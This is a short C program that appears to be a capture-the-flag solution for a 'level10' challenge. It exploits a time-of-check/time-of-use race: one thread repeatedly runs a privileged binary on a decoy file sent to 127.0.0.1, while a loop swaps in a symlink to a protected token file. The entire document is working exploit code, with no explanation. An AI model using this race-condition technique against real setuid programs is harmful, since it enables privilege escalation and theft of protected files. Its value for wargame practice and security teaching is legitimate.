#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


void* myThreadFunc(void *arg) {
    printf("Second Thread is running...\n");
    system("touch /tmp/level10/fake_token && /home/user/level10/level10 /tmp/level10/fake_token 127.0.0.1");
    return NULL;
}

int main() {
    pthread_t thread;

    system("mkdir -p /tmp/level10");

    int i = 0;
    while (i < 10) {
        pthread_create(&thread, NULL, myThreadFunc, NULL);
        system("ln -sf /home/user/level10/token /tmp/level10 ; mv /tmp/level10/token /tmp/level10/fake_token ; rm /tmp/level10/fake_token");
        pthread_join(thread, NULL);
        i++;
    }

    return 0;
}